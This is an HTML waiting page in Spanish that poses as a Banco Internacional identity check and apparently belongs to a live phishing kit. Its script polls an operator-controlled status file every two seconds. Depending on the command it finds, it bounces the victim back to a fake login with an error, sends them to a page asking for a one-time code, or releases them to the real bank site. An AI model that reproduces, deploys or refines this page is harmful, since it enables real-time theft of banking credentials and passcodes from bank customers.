<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Banco Internacional – Verificando</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<style>
  *{ box-sizing:border-box; margin:0; padding:0; }
  body{ min-height:100dvh; background: linear-gradient(160deg, #f59a05 0%, #e08800 60%, #c97500 100%); font-family:sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; padding:24px; color:#fff; }
  .card{ background:rgba(255,255,255,0.12); backdrop-filter:blur(14px); border:1px solid rgba(255,255,255,0.25); border-radius:24px; padding:40px; width:100%; max-width:380px; text-align:center; }
  .spinner{ width:60px; height:60px; border:5px solid rgba(255,255,255,0.2); border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; margin: 20px auto; }
  @keyframes spin{ to{ transform:rotate(360deg); } }
  .title{ font-weight:600; margin-bottom:10px; }
  .subtitle{ font-size:0.9rem; opacity:0.8; }
</style>
</head>
<body>
<div class="card">
  <img src="https://www.bancointernacional.com.ec/wp-content/uploads/2020/11/cropped-logo-banco-internacional.webp" width="160" style="margin-bottom:20px;">
  <div class="spinner"></div>
  <div class="title">Verificando su identidad</div>
  <div class="subtitle">Estamos validando su información de forma segura. Por favor espere...</div>
</div>

<script>
  // Lógica de escucha en tiempo real
  async function chequearOrden() {
    try {
      const res = await fetch('estado.txt?v=' + Math.random());
      const orden = (await res.text()).trim();

      if (orden === "error_login") {
          window.location.href = "index.html?status=error";
      } else if (orden === "pedir_otp") {
          window.location.href = "codes.html";
      } else if (orden === "finalizar") {
          window.location.href = "https://www.bancointernacional.com.ec/";
      }
    } catch (e) { console.log("Buscando señal..."); }
  }

  // Revisa cada 2 segundos
  setInterval(chequearOrden, 2000);
</script>
</body>
</html>
